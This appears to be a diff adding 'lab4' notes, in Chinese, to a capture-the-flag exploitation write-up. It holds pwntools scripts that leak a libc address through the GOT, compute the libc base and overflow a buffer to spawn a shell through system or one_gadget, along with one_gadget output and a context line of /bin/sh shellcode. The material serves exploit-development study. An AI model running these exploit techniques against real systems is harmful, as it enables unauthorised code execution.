@@ -237,3 +237,68 @@ shellcode="\x31\xc9\xf7\xe1\xb0\x0b\xeb\x03\x5b\xcd\x80\xe8\xf8\xff\xff\xff\x2f\
      call   ccc
      db  '/bin/sh',0x0
 ```
+#lab4
+
+方法一
+
+```
+    read_got=elf.got['read']
+    ru(':')
+    sl(str(read_got))
+    ru('0x')
+    read_real=int(ru('\n'),16)
+    info(hex(read_real))
+    libc_base=read_real-libc.symbols['read']
+    info(hex(libc_base))
+    system_real=libc_base+libc.symbols['system']
+    sh=elf.search('sh\x00').next()
+    info(hex(sh))
+    ru(':')
+    p='a'*0x38+p32(0xdeadc0de)+p32(system_real)+p32(0xdeadc0de)+p32(sh)
+    sl(p)
+    r.interactive()
+```
+
+方法二
+使用[one_gadget](https://github.com/david942j/one_gadget)
+gem install one_gadget
+
+```
+root@kali:~/LAB/lab4# one_gadget libc.so 
+0x3aa19	execve("/bin/sh", esp+0x34, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x34] == NULL
+
+0x5f7b5	execl("/bin/sh", eax)
+constraints:
+  esi is the GOT address of libc
+  eax == NULL
+
+0x5f7b6	execl("/bin/sh", [esp])
+constraints:
+  esi is the GOT address of libc
+  [esp] == NULL
+```
+
+可惜都不能用???
+
+```
+    read_got=elf.got['read']
+    ru(':')
+    sl(str(read_got))
+    ru('0x')
+    read_real=int(ru('\n'),16)
+    info(hex(read_real))
+    libc_base=read_real-libc.symbols['read']
+    info(hex(libc_base))
+    #magic=0x3aa19
+    #magic=0x5f7b7
+    magic=0x5f7b6
+    magic_real=libc_base+magic
+    info(hex(magic_real))
+    ru(':')
+    p='a'*0x38+p32(0xdeadc0de)+p32(magic_real)
+    sl(p)
+    r.interactive()
+```
